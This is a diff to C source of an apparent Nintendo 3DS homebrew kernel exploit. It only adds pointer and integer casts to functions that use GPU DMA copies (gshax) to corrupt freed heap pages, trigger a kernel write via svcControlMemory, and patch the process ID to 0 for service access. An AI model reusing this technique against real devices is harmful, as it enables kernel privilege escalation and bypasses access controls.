@@ -90,13 +90,13 @@ void do_gshax_copy(void *dst, const void *src, unsigned int len)
 
 	do
 	{
-		compat.app.memcpy(0x18401000, 0x18401000, 0x10000);
-		compat.app.GSPGPU_FlushDataCache(src, len);
+		compat.app.memcpy((void*)0x18401000, (void*)0x18401000, 0x10000);
+		compat.app.GSPGPU_FlushDataCache((void*)src, len);
 		// src always 0x18402000
 		compat.app.GX_SetTextureCopy(src, dst, len, 0, 0, 0, 0, 8);
-		compat.app.GSPGPU_FlushDataCache(0x18401000, 16);
-		compat.app.GX_SetTextureCopy(dst, 0x18401000, 0x40, 0, 0, 0, 0, 8);
-		compat.app.memcpy(0x18401000, 0x18401000, 0x10000);
+		compat.app.GSPGPU_FlushDataCache((void*)0x18401000, 16);
+		compat.app.GX_SetTextureCopy(dst, (void*)0x18401000, 0x40, 0, 0, 0, 0, 8);
+		compat.app.memcpy((void*)0x18401000, (void*)0x18401000, 0x10000);
 	}while(--i > 0);
 }
 
@@ -129,8 +129,8 @@ void arm11_kernel_exploit_setup(void)
 	compat.app.svcControlMemory(&mem_hax_mem, 0, 0, 0x6000, 0x10003, 1 | 2);
 
 	void* tmp_addr;
-	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x4000, 0, 0x1000, 1, 0); // free page
-	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 1, 0); // free page
+	compat.app.svcControlMemory(&tmp_addr, (int)mem_hax_mem + 0x4000, 0, 0x1000, 1, 0); // free page
+	compat.app.svcControlMemory(&tmp_addr, (int)mem_hax_mem + 0x1000, 0, 0x2000, 1, 0); // free page
 
 	unsigned int saved_heap_3[8];
 	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x1000, 0x20u);
@@ -140,8 +140,8 @@ void arm11_kernel_exploit_setup(void)
 	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x4000, 0x20u);
 	compat.app.memcpy(saved_heap_2, arm11_buffer, sizeof(saved_heap_2));
 
-	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x2000, 0x10003, 1 | 2);
-	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x2000, 0, 0x1000, 1, 0); // free page
+	compat.app.svcControlMemory(&tmp_addr, (int)mem_hax_mem + 0x1000, 0, 0x2000, 0x10003, 1 | 2);
+	compat.app.svcControlMemory(&tmp_addr, (int)mem_hax_mem + 0x2000, 0, 0x1000, 1, 0); // free page
 
 	do_gshax_copy(arm11_buffer, mem_hax_mem + 0x2000, 0x20u);
 
@@ -157,7 +157,7 @@ void arm11_kernel_exploit_setup(void)
 	do_gshax_copy(mem_hax_mem + 0x2000, arm11_buffer, 0x10u);
 
 	// Trigger write to kernel
-	compat.app.svcControlMemory(&tmp_addr, mem_hax_mem + 0x1000, 0, 0x1000, 1, 0);
+	compat.app.svcControlMemory(&tmp_addr, (int)mem_hax_mem + 0x1000, 0, 0x1000, 1, 0);
 
 	compat.app.memcpy(arm11_buffer, saved_heap_3, sizeof(saved_heap_3));
 	do_gshax_copy(mem_hax_mem + 0x1000, arm11_buffer, 0x20u);
@@ -306,7 +306,7 @@ void patch_srv_access()
 
 	// PID patching and unpatching idea: service-patch (archshift and Yifan Lu)
 	// Set pid to 0
-	arm11_kernel_exploit_exec(patch_kernel);
+	arm11_kernel_exploit_exec((void*)patch_kernel);
 
 	// Reinit srv
 	if(reinit_srv() != 0)
@@ -320,6 +320,6 @@ void patch_srv_access()
 		"mov r12, %[target_pid]\t\n"
 		::[target_pid] "r" (old_pid)
 	);
-	arm11_kernel_exploit_exec(unpatch_pid);
+	arm11_kernel_exploit_exec((void*)unpatch_pid);
 }
 
